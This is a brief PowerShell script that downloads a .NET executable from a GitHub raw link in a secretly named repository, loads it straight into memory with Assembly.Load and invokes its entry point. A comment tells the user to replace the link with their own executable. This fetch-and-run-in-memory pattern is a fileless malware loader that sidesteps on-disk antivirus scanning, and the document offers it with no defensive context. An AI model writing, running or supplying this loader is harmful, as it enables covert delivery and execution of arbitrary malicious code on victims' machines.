
$downloadUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/test.exe"  # Replace with the link to your C# executable

$assemblyBytes = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes.Content)

$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('foo', 'bar')))
